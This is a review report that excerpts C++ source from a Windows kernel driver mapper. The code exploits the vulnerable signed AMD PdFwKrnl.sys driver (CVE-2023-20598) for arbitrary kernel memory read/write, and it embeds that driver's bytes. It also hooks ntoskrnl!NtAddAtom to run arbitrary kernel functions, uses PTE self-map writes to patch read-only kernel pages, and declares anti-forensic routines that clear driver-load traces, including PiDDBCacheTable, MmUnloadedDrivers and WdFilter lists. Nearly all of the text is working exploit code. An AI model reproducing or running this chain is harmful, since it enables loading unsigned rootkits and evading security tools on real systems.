# TASK-002 Risk Code Excerpts

- HEAD: 6d20e98a254608bc762b6bd212a50e8db989eb76
- Branch: `orchestrator/TASK-002`
- Tag: `baseline-002-pre`
- Date: 2026-10-27

## R1 — Mapper Provider IOCTL (P0)

Files excerpted:
- `D:\Ameger\Mapper\Mapper\Provider\Provider.hpp`: full file, lines 1-70.
- `D:\Ameger\Mapper\Mapper\Provider\Driver.hpp`: full file, lines 1-474.
- `D:\Ameger\Mapper\Mapper\Provider\Driver.cpp`: lines 1287-1406 and lines 2219-2268, including `Driver::MemCopy`, `ReadMemory`, `WriteMemory`, the `DeviceIoControl` call site at line 1336, and caller sites at lines 1347, 1353, 2234, and 2252.
- `D:\Ameger\Mapper\Mapper\Provider\Service.cpp`: READ_FAILED - File not found.
- `D:\Ameger\Mapper\Mapper\Provider\Resource.hpp`: lines 1-60 pasted; lines 61-764 omitted because they are the embedded `PdFwKrnl` driver byte array, not additional IOCTL ABI definitions. The only relevant section naming the provider is the header comment at line 4.

### Provider.hpp (lines 1-70)

```cpp
#pragma once

#include <Windows.h>
#include <cstdint>

/*
 * The vulnerable driver that provides the kernel read/write primitive.
 *
 * A "provider" is a legitimately signed third-party driver with a hole that
 * gives arbitrary kernel memory access. Everything above this layer (mapping,
 * relocations, imports, kernel calls, anti-forensics) is provider independent;
 * only the device name and the memcpy IOCTL below differ.
 *
 * The embedded driver resource (Resource.hpp) MUST contain the .sys binary of
 * this provider, otherwise loading it will fail.
 *
 *  AMD PdFwKrnl.sys - AMD USB-C Power Delivery Firmware Update Utility driver,
 *  CVE-2023-20598. Ships with AMD Radeon Software up to and including 23.9.1.
 *  Device: \Device\PdFwKrnl  IOCTL: 0x80002014
 *
 * The request carries raw source/destination virtual addresses that the driver
 * memcpy's without validation, so it is a direct virtual read/write. It cannot
 * write to read-only pages, which is handled through the PTE self-map in
 * Driver.cpp.
 */

namespace Provider
{
	//Device path opened with CreateFileW. "\\.\PdFwKrnl" resolves to the
	//kernel device \Device\PdFwKrnl.
	constexpr const wchar_t* kDeviceName = L"\\\\.\\PdFwKrnl";

	//Human readable name, used only in log output.
	constexpr const wchar_t* kShortName = L"AMD PdFwKrnl";

	//The IOCTL that performs the unchecked copy.
	constexpr ULONG32 kCopyIoctl = 0x80002014;

	/*
	 * Layout of the IOCTL input buffer.
	 *
	 * The driver validates the size of this buffer but not the pointers inside
	 * it, which is the bug: it is handed an arbitrary read or write.
	 *
	 * Packed because the driver indexes the fields by byte offset. The three
	 * reserved fields are not reserved by us - they are expected to be zero
	 * and are passed through untouched.
	 */
#pragma pack(push, 1)
	struct CopyRequest {
		BYTE Reserved[16];
		PVOID Destination;
		PVOID Source;
		PVOID Reserved2;
		DWORD Size;
		DWORD Reserved3;
	};
#pragma pack(pop)

	//Fill a CopyRequest with the three values that matter.
	//This is the whole provider abstraction: MemCopy in Driver.cpp calls this
	//and issues the IOCTL, and every other memory helper in the project is
	//built on top of it.
	inline void FillCopyRequest(CopyRequest& request, uint64_t destination, uint64_t source, uint64_t length) {
		request = CopyRequest{};
		request.Destination = (PVOID)destination;
		request.Source = (PVOID)source;
		request.Size = (DWORD)length;
	}
}
```

### Driver.hpp (lines 1-474)

```cpp
#pragma once

#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <string>

#include "../Utilities/Console.hpp"
#include "../App/NT.hpp"
#include "../Symbols/Handler/SymbolsHandler.hpp"

/*
* Structure offsets used while walking kernel objects.
*
* The defaults are values that have been stable across Windows builds, but every
* one of them is replaced at runtime by the offset of the real type in the
* running kernel (the symbol tool writes them into Offsets.ini as
* "[<module>.fields] Struct.Field=<offset>").
*
* Anything that cannot be resolved from symbols is not trusted on its own: the
* caller must structurally validate the object before writing to it.
*
* PDB_OFFSETS is not optional. The build that ships defines it, and the kernel
* walks read SymbolsHandler unconditionally from Driver.cpp, so a configuration
* without it does not fall back to compiled-in offsets - it does not compile.
* The guards that used to suggest otherwise have been removed rather than left
* to mislead the next reader.
*/
struct DriverOffsets {
	uint32_t FileObject_DeviceObject = 0x8;
	uint32_t DeviceObject_DriverObject = 0x8;
	uint32_t DriverObject_DriverSection = 0x28;
	uint32_t LdrEntry_BaseDllName = 0x58;
	uint32_t AvlTable_DeleteCount = 0x40;

	//_PiDDBCacheEntry and HashBucketEntry are not UDTs in the public PDBs, so
	//these stay at their compiled defaults and are additionally derived at
	//runtime by content matching in the callers.
	uint32_t PiDDBCacheEntry_ListBlink = 0x8;
	uint32_t PiDDBCacheEntry_ListFlink = 0x0;
	uint32_t HashBucketEntry_DriverName = 0x8;

	/*
	 * Upper bound on a plausible member offset for any of the types above.
	 *
	 * The largest is _KLDR_DATA_TABLE_ENTRY, which is a few hundred bytes; a
	 * kilobyte is far past anything real and below the first page, so a resolved
	 * value at or above it means the entry in Offsets.ini does not describe the
	 * field that was asked for. Used to reject a bad resolution loudly rather
	 * than quietly keep the compiled default.
	 */
	static constexpr uint64_t kMaxFieldOffset = 0x1000;

	bool ResolvedFromSymbols = false;

	//Count of the public UDT fields above that were replaced with this build's
	//own offset. Reported alongside ResolvedFromSymbols so a partial resolution
	//is visible rather than hidden behind a single boolean.
	uint32_t ResolvedFieldCount = 0;

	//Total number of fields that have a public UDT to resolve against. The
	//internal types further down deliberately have none, so they are not counted.
	static constexpr uint32_t kResolvableFieldCount = 5;

	/*
	 * Offsets inside _DRIVER_OBJECT and _DRIVER_EXTENSION.
	 *
	 * Separate from the block above because these are only needed to build the
	 * DRIVER_OBJECT handed to DriverEntry, and because a miss here is expected
	 * on builds that do not publish one of them - the constructor validates what
	 * it wrote instead of assuming the layout.
	 *
	 * Defaults are the x64 values. _DRIVER_EXTENSION has no Size member in the
	 * PDB type stream, so nothing is written there: the back-pointer below is
	 * the only field the constructor touches, because it is the one
	 * IoCreateDevice dereferences.
	 */
	uint32_t DriverObject_Size = 0x02;
	uint32_t DriverObject_DriverStart = 0x18;
	uint32_t DriverObject_DriverSize = 0x20;
	uint32_t DriverObject_DriverExtension = 0x30;
	uint32_t DriverObject_Flags = 0x10;
	uint32_t DriverObject_DriverUnload = 0x68;
	uint32_t DriverExtension_DriverObject = 0x00;

	//How many of the seven fields above were replaced with this build's own.
	uint32_t DriverObjectResolvedCount = 0;
	static constexpr uint32_t kDriverObjectResolvableFieldCount = 7;

	void LoadFromSymbols() {
		const auto lookup = [](const wchar_t* name, uint32_t& target) {
			const auto value = SymbolsHandler::GetInstance()->GetFieldOffset(name);
			//A field that resolves to something past this bound cannot be a
			//member offset of any of the types involved, so it is treated as a
			//resolution failure rather than silently written over the compiled
			//default. Previously such a value was dropped without a line of log
			//and the run continued on the default, which is the one failure mode
			//this file exists to prevent.
			if (value == SymbolsHandler::kFieldUnresolved || value >= kMaxFieldOffset) {
				if (value != SymbolsHandler::kFieldUnresolved)
					Log(L"[!] Field " << Val(name) << L" resolved to " << Val(Hex(value))
						<< L", outside the plausible offset range; keeping the compiled default" << std::endl);
				return false;
			}
			target = static_cast<uint32_t>(value);
			return true;
		};

		uint32_t resolved = 0;
		resolved += lookup(L"_FILE_OBJECT.DeviceObject", FileObject_DeviceObject) ? 1u : 0u;
		resolved += lookup(L"_DEVICE_OBJECT.DriverObject", DeviceObject_DriverObject) ? 1u : 0u;
		resolved += lookup(L"_DRIVER_OBJECT.DriverSection", DriverObject_DriverSection) ? 1u : 0u;
		resolved += lookup(L"_KLDR_DATA_TABLE_ENTRY.BaseDllName", LdrEntry_BaseDllName) ? 1u : 0u;
		resolved += lookup(L"_RTL_AVL_TABLE.DeleteCount", AvlTable_DeleteCount) ? 1u : 0u;

		ResolvedFieldCount = resolved;
		//All or nothing, matching how every other resolver in this project
		//treats a partial answer. A single resolved field used to set this flag
		//and the caller then reported "offsets resolved from symbols for this
		//build" while four fields were still compiled-in guesses.
		ResolvedFromSymbols = (resolved == kResolvableFieldCount);

		/*
		 * Same treatment for the DRIVER_OBJECT layout. Counted separately from
		 * the five above because a miss here is normal on some builds and only
		 * degrades the DRIVER_OBJECT the mapper builds; it does not invalidate
		 * the offsets the kernel structure walks use.
		 */
		uint32_t object_fields = 0;
		object_fields += lookup(L"_DRIVER_OBJECT.Size", DriverObject_Size) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverStart", DriverObject_DriverStart) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverSize", DriverObject_DriverSize) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverExtension", DriverObject_DriverExtension) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.Flags", DriverObject_Flags) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_OBJECT.DriverUnload", DriverObject_DriverUnload) ? 1u : 0u;
		object_fields += lookup(L"_DRIVER_EXTENSION.DriverObject", DriverExtension_DriverObject) ? 1u : 0u;
		DriverObjectResolvedCount = object_fields;
	}
};

namespace Driver
{
	extern DriverOffsets g_offsets;
	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;
	extern bool g_skipForensicCleanup;

	//Load the provider, resolve offsets, verify the PTE self-map and run the
	//cleanup walks. Tears everything down again on any failure.
	NTSTATUS Load();
	NTSTATUS Unload();
	NTSTATUS AcquireDebugPrivilege();

	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	bool IsRunning();
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);

	//Write to a page that is currently read-only, by temporarily making it
	//writable through the PTE self-map. See the implementation in Driver.cpp.
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);

	//The provider's memcpy. ReadMemory and WriteMemory are both this.
	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);

	uint64_t AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(uint64_t address);

	//Page aligned, physically contiguous allocation for the image. Needed
	//because a pool block's first and last page are shared with pool metadata.
	uint64_t AllocateContiguous(uint64_t size);
	bool MmFreeContiguousMemory(uint64_t address);

	/*
	 * Build the DRIVER_OBJECT handed to a mapped driver's DriverEntry.
	 *
	 * DriverEntry's contract is DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING).
	 * A driver calls IoCreateDevice before it has registered anything else, and
	 * that call dereferences DriverObject->DriverExtension and the extension's
	 * own back-pointer, so a NULL DriverObject is a guaranteed bugcheck rather
	 * than something a driver can ignore.
	 *
	 * Returns the address of the object, 0 on failure. Two nonpaged blocks are
	 * taken: the extension and the object itself, both zeroed before a single
	 * field is written, so a member the PDB did not describe is zero rather than
	 * whatever was in the pool.
	 *
	 * driver_start/driver_size describe the mapped image and land in DriverStart
	 * and DriverSize; driver_section is what belongs in DriverSection, and the
	 * caller passes the image base for a driver that has no real section.
	 *
	 * Every field is written through a helper that bounds the write inside the
	 * allocation, and every pointer written is checked to be one this process
	 * holds. The object is not registered anywhere: it is owned by the caller
	 * and must outlive DriverEntry, because a driver keeps a reference to it
	 * for as long as it is loaded.
	 */
	uint64_t CreateDriverObjectForEntry(uint64_t driver_start, uint64_t driver_size, uint64_t driver_section);

	//Releases both blocks CreateDriverObjectForEntry took. Only valid before
	//DriverEntry has been entered - see MapDriver for the lifetime rule.
	bool DestroyDriverObjectForEntry(uint64_t driver_object);

	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	//Resolve an export by name in a loaded kernel module, 0 when not found or
	//when any validation of the export directory fails.
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);

	/*
	 * Resolve an export by ordinal in a loaded kernel module, 0 when the ordinal
	 * is below the table base or above NumberOfFunctions.
	 *
	 * Uses the function-address table directly and does not need the name or
	 * ordinal tables, so it works for modules that export nothing by name.
	 */
	uint64_t GetKernelModuleExportOrdinal(uint64_t kernel_module_base, uint16_t ordinal);

	//Kernel helpers reached through the call hook below.
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	Nt::PiDDBCacheEntry* LookupEntry(Nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);

	//Trace removal. Each one is a no-op when its structure cannot be found and
	//returns false without writing when anything fails validation.
	//Skipped entirely when g_skipForensicCleanup is set.
	bool ClearPiDDBCacheTable();
	bool ClearKernelHashBucketList();
	bool ClearMmUnloadedDrivers();
	bool ClearWdFilterDriverList();

	/*
	 * Outcome of the most recent CallKernelFunction, as set by that call.
	 *
	 * Read it immediately after the call returns and before doing anything else,
	 * because the next call overwrites it. It exists for the one caller that
	 * owns memory the target may have adopted: CallKernelFunction returning true
	 * says the target ran, and this says whether ntoskrnl was left clean.
	 *
	 * A file scope inline variable rather than a local static, so the one piece of
	 * state it names is visible as such at the point it is read. It is still a
	 * plain bool with no synchronisation, which is correct for the single
	 * threaded flow this runs in and is not correct for two threads calling
	 * CallKernelFunction at once - see CallKernelFunction's own note for why that
	 * is not something a flag could fix anyway.
	 */
	inline bool g_restore_succeeded = false;

	inline bool& RestoreSucceeded() {
		return g_restore_succeeded;
	}

	/*
	 * Call an arbitrary kernel function from user mode.
	 *
	 * How it works: ntoskrnl!NtAddAtom is overwritten with
	 *
	 *     mov rax, <target>   ; 48 b8 <8 byte address>
	 *     jmp rax             ; ff e0
	 *
	 * Calling NtAddAtom from user mode therefore jumps to `target` in kernel
	 * context. The original 12 bytes are read back first and restored as soon
	 * as the call returns, so the hook exists only for the duration of one call.
	 *
	 * Why this is safe enough to do:
	 *   - the prologue is verified to look like real code before patching, so a
	 *     wrong address aborts instead of being written over
	 *   - a prologue that is already the hook shape means another instance is
	 *     running, which is refused
	 *   - the original bytes are restored on both the success and failure path
	 *   - the write itself goes through WriteToReadOnlyMemory, which requires a
	 *     verified PTE self-map
	 *
	 * Residual risk that cannot be designed away: if the process is killed
	 * between the patch and the restore, or the kernel crashes for an unrelated
	 * reason while patched, NtAddAtom is left pointing at the last target.
	 * Another process calling NtAddAtom during the hook window races the call
	 * to the target function. The window is ~10 instructions and cannot be
	 * closed without serialising every NtAddAtom call system-wide.
	 *
	 * Every argument must be trivially copyable and there can be at most 4 of
	 * them, since the hook passes everything through registers.
	 *
	 * T is the return type; T = void means no result is stored.
	 *
	 * Return value: whether the TARGET was invoked - that is, whether the hook
	 * was installed and the call was made. It deliberately does not report the
	 * restore, because the two must not be conflated:
	 *
	 *   - a false return means the target never ran, so nothing the caller
	 *     passed in has been touched and the caller is free to clean up
	 *   - a true return means the target ran and may have taken ownership of,
	 *     or written through, whatever the caller owns. Releasing that state
	 *     now would corrupt memory a running kernel object is using.
	 *
	 * That distinction is why the restore does not decide this return value.
	 * LastCallHookRestored() reports the restore separately; a caller that owns
	 * state the target may have adopted has to check it.
	 */
	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//Only up to 4 arguments can be forwarded through the syscall jump.
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: too many arguments");

		//Every return below leaves this false, so the caller's flag is only ever
		//set once the restore has actually been confirmed.
		RestoreSucceeded() = false;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to get ntdll.dll" << std::endl);
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom) {
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		//memcpy instead of a cast: writing through *(uint64_t*)&array[2] is an
		//unaligned access and undefined behaviour.
		memcpy(&kernel_injected_jmp[2], &kernel_function_address, sizeof(kernel_function_address));

		//Cached once resolved: the export is the same for the whole run, and
		//resolving it walks the kernel export directory.
		//
		//Retry-on-zero, not one-shot static initialisation. A one-shot
		//initialiser runs on the first call only, so a first call made before
		//ntoskrnlAddr was resolved cached 0 forever and every later call
		//reported the same failure without retrying. Same shape as the export
		//resolvers in Driver.cpp.
		//
		//One copy per instantiation, not one per process: each distinct argument
		//list A... gets its own variable, so each signature resolves NtAddAtom
		//once rather than sharing a single lookup. That is a redundant export
		//walk per signature on first use, which is not worth a template-level
		//cache with its own lifetime rules in exchange for.
		static uint64_t kernel_NtAddAtom = 0;
		if (!kernel_NtAddAtom) {
			kernel_NtAddAtom = GetKernelModuleExport(Driver::ntoskrnlAddr, "NtAddAtom");
			if (!kernel_NtAddAtom) {
				Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
				return false;
			}
		}

		if (!ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked! another instance of Mapper running?!" << std::endl);
			return false;
		}

		//Pre-flight: refuse to patch anything that does not look like the
		//beginning of a function. Failing here is safe, clobbering a wrong
		//address is a guaranteed bugcheck.
		//Accepts the REX prefixes, push/pop, the common mov-immediate form, and
		//the endbr64 that CET enabled builds start functions with. Rejects
		//int3 padding and anything all zeroes, which is what free memory looks
		//like when the address is wrong.
		auto looks_like_function_prologue = [](const uint8_t* bytes) -> bool {
			uint8_t nonzero = 0;
			for (int i = 0; i < 12; ++i) {
				if (bytes[i] == 0xCC) //int3 padding
					return false;
				if (bytes[i] != 0)
					nonzero++;
			}
			if (nonzero < 2)
				return false;

			switch (bytes[0]) {
			case 0x40: case 0x41: case 0x44: case 0x48: case 0x49:
			case 0x4C: case 0x4D: case 0x50: case 0x51: case 0x52:
			case 0x53: case 0x54: case 0x55: case 0x56: case 0x57:
			case 0xB8: case 0xE9: case 0x0F:
				return true;
			case 0xF3:
				return (bytes[1] == 0x0F && bytes[2] == 0x1E); //endbr64
			default:
				return false;
			}
		};

		if (!looks_like_function_prologue(original_kernel_function)) {
			Log(L"[-] FAILED!: ntoskrnl.NtAddAtom does not look like code, refusing to patch" << std::endl);
			return false;
		}

		if (!WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		/*
		 * From here the target runs. Everything above could fail without the
		 * kernel having executed anything; everything below must be treated as
		 * cleanup of state that may already have been modified.
		 */
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		/*
		 * Restore the original bytes.
		 *
		 * Attempted twice. The second attempt exists because the failure mode
		 * is a transient fault in the provider's copy (the same stale-TLB window
		 * WriteToReadOnlyMemory documents), not a refused write - which a
		 * second attempt pastes into.
		 *
		 * Whatever the outcome, the target has already run, so this function
		 * returns true: the caller must learn that the kernel state it passed in
		 * may have been taken over. A failure to restore is reported through
		 * hook_restored instead, because folding it into the return value is
		 * what previously let a caller release memory a running kernel object
		 * was using.
		 */
		bool restored = WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));

		if (!restored) {
			Log(L"[!] NtAddAtom restore failed, retrying" << std::endl);
			restored = WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
		}

		if (!restored) {
			//ntoskrnl is still patched. Say so plainly: the process must not exit
			//believing the hook is gone, because NtAddAtom will jump into the
			//last target until something else restores it.
			Log(L"[!!] CRITICAL: ntoskrnl.NtAddAtom is still hooked after a "
				"failed restore. Do not terminate this process: every NtAddAtom "
				"call on this machine now jumps to the last target until the page "
				"is repaired." << std::endl);
		}
		else {
			RestoreSucceeded() = true;
		}

		return true;
	}
}
```

### Driver.cpp (lines 1287-1406)

```cpp
	//
	//Attempted even when the wipe failed. Removing the directory entry still takes
	//the file away by name, and its clusters are unreachable that way even though
	//they keep the content - so "not wiped but removed" is materially better than
	//"not wiped and still there", and is worth the attempt.
	std::error_code remove_error;
	const bool removed = std::filesystem::remove(driver_path, remove_error);

	if (!removed || remove_error) {
		if (remove_error) {
			Log(L"[-] Could not remove the provider file (error "
				<< Val(static_cast<unsigned long>(remove_error.value())) << L")" << std::endl);
		}
		else {
			Log(L"[-] Could not remove the provider file" << std::endl);
		}

		/*
		 * Still there. If the bytes were also not destroyed, or the service
		 * failed, something was left behind and the returned status has to say so:
		 * it is the only way the caller can tell this run from a clean one.
		 */
		if (!wiped && NT_SUCCESS(service_status))
			return STATUS_DELETE_PENDING;

		return service_status;
	}

	if (!wiped) {
		//Removed but not overwritten: the image is gone by name while its clusters
		//still hold it. Said plainly, so the removal does not read as a completed
		//wipe.
		Log(L"[!] The provider file was removed without being overwritten; its clusters still hold the image until they are reused" << std::endl);
	}

	//The service result is returned last, and only matters when it was a failure:
	//a successful wipe of a file whose driver is still resident is not a clean
	//teardown, and the caller has to be able to say so.
	return service_status;
}

bool Driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return false;

	Provider::CopyRequest request{};
	Provider::FillCopyRequest(request, destination, source, size);

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, Provider::kCopyIoctl, &request, sizeof(request), nullptr, 0, &bytes_returned, nullptr) != FALSE;
}

/*
 * Read kernel memory into a user mode buffer.
 *
 * The provider memcpy's without validating either address, so a bad address
 * here faults inside the provider. Callers are responsible for only passing
 * addresses they have resolved or verified.
 */
bool Driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
}

//Write a user mode buffer into kernel memory.
//Subject to the same constraint as ReadMemory.
bool Driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}

/*
* PTE self-mapping helpers (x64 Windows).
*
* A provider that only exposes a virtual read/write (a plain kernel memcpy,
* e.g. CVE-2023-20598 in PdFwKrnl) cannot write to read-only kernel pages:
* the copy runs with the CPU page permissions applied and faulting in kernel
* context is an instant bugcheck (0x50).
*
* The kernel aliases its own page tables into the system VA range and those PTE
* pages are ordinary writable kernel memory, so a read-only page can be made
* writable from user mode through the provider: read the PTE, set the RW bit,
* clear NX, write, then restore the original PTE.
*
* The self-map window base is a fixed architectural constant (0xFFFFF68000000000
* on every Windows release since Vista - it is what WinDbg's !pte uses), but it
* is still verified here before it is used: a wrong base means either an
* unmapped read (bugcheck) or a kernel memory corruption. The verification reads
* the PTEs of the first pages of ntoskrnl and requires a pair whose page frame
* numbers differ by exactly one. If that fails, read-only writes are disabled
* instead of continuing blind.
*/
static bool g_pteSelfMapReady = false;
static bool g_pteSelfMapProbed = false;
static bool ProbePteSelfMapBase();

/*
 * Internal types whose layout is not in the public PDBs (_PiDDBCacheEntry,
 * HashBucketEntry and the WdFilter driver info) still need field offsets.
 * Instead of trusting a hardcoded number, locate the field by content: scan the
 * object for a UNICODE_STRING that actually contains the string we are looking
 * for. A match is its own proof, so the offset can be trusted afterwards, and a
 * miss is a clean abort instead of a corrupted kernel structure.
 */

//Read the string a UNICODE_STRING points at, after checking that the structure
//itself is plausible: a kernel range pointer, a non zero length that fits the
//field and is a whole number of characters, and a MaximumLength that covers
//the Length. Returns false rather than following a bad pointer.
static bool ReadWideStringField(const UNICODE_STRING& text, std::wstring& out) {
	if (!text.Buffer || text.Length == 0 || text.Length > 512 || (text.Length % sizeof(wchar_t)) != 0)
		return false;
	if ((uint64_t)text.Buffer < 0xFFFF000000000000ULL)
		return false;
	if (text.MaximumLength < text.Length)
		return false;

	auto buffer = std::make_unique<wchar_t[]>((ULONG64)text.Length / 2ULL + 1ULL);
	if (!Driver::ReadMemory((uintptr_t)text.Buffer, buffer.get(), text.Length))
		return false;

	out.assign(buffer.get());
```

### Driver.cpp caller contexts (lines 2219-2268)

```cpp
	require(o.DriverObject_DriverExtension, sizeof(uint64_t));
	require(o.DriverObject_DriverUnload, sizeof(uint64_t));
	require(kDriverObjectTypeOffset, sizeof(uint16_t));

	return needed;
}

//A zero page used to clear a kernel allocation without a user mode buffer.
static constexpr BYTE kZeroPage[4096] = {};

//Zero size bytes at destination, through the provider.
static bool ZeroKernelMemory(uint64_t destination, uint64_t size) {
	uint64_t done = 0;
	while (done < size) {
		const uint64_t chunk = (size - done) < sizeof(kZeroPage) ? (size - done) : sizeof(kZeroPage);
		if (!Driver::MemCopy(destination + done, reinterpret_cast<uint64_t>(kZeroPage), chunk))
			return false;
		done += chunk;
	}
	return true;
}

/*
 * Write value into object + offset, after proving the write fits inside object.
 *
 * Every field of the object and the extension goes through this. The offsets are
 * file controlled in the sense that they come from Offsets.ini, so a wrong entry
 * would otherwise write into neighbouring pool memory or past the block.
 */
template<typename T>
static bool WriteBounded(uint64_t object, uint64_t object_size, uint32_t offset, const T& value) {
	if (offset > object_size || sizeof(T) > object_size - offset)
		return false;
	return Driver::MemCopy(object + offset, reinterpret_cast<uint64_t>(&value), sizeof(T));
}

//Read back a pointer-sized field and require it to be one this process holds.
static bool ReadBoundedPointer(uint64_t object, uint64_t object_size, uint32_t offset, uint64_t& out) {
	if (offset > object_size || sizeof(uint64_t) > object_size - offset)
		return false;
	out = 0;
	return Driver::ReadMemory(object + offset, &out, sizeof(out));
}

//Read back a ULONG field, bounded the same way.
static bool ReadBoundedULong(uint64_t object, uint64_t object_size, uint32_t offset, uint32_t& out) {
	if (offset > object_size || sizeof(uint32_t) > object_size - offset)
		return false;
	out = 0;
	return Driver::ReadMemory(object + offset, &out, sizeof(out));
```

### Resource.hpp (lines 1-60)

```cpp
#pragma once
#include <stdint.h>

// PdFwKrnl.sys - AMD USB-C Power Delivery Firmware Update Utility driver (CVE-2023-20598)
// KDU provider 44, SHA1 A24840E32071E0F64E1DFF8CA540604896811587, 30144 bytes
namespace Resource
{
	static const uint8_t driver[] = {
		0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
		0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
		0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD1, 0x77, 0xBD, 0xFD, 0x95, 0x16, 0xD3, 0xAE, 0x95, 0x16, 0xD3, 0xAE, 0x95, 0x16, 0xD3, 0xAE, 0xDE, 0x6E, 0xD2, 0xAF, 0x96, 0x16, 0xD3, 0xAE, 0x95, 0x16, 0xD2, 0xAE, 0x84, 0x16, 0xD3, 0xAE,
		0xDE, 0x6E, 0xD0, 0xAF, 0x96, 0x16, 0xD3, 0xAE, 0xDE, 0x6E, 0xD7, 0xAF, 0x91, 0x16, 0xD3, 0xAE, 0x16, 0x6F, 0xDB, 0xAF, 0x94, 0x16, 0xD3, 0xAE, 0x16, 0x6F, 0x2C, 0xAE, 0x94, 0x16, 0xD3, 0xAE, 0x16, 0x6F, 0xD1, 0xAF, 0x94, 0x16, 0xD3, 0xAE,
		0x52, 0x69, 0x63, 0x68, 0x95, 0x16, 0xD3, 0xAE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x07, 0x00,
